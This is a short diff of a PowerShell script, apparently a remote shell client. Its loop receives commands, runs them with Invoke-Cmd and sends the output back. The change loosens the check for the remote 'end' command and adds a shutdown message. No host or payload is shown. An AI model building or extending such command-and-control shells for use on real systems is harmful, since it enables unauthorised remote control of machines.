@@ -83,10 +83,10 @@ while ($connected) {
     $command = Get-Command
 
     # Look for the end command which stops the shell remotely
-    if ($command -eq $END_CMD) {
+    if ($command -like "*$END_CMD*") {
+        Write-Host "Shutting down"
         $connected = $false
-    }
-    else {
+    } else {
         # Else execute the command and send the response
         $response = Invoke-Cmd $command
         Send-Response $response
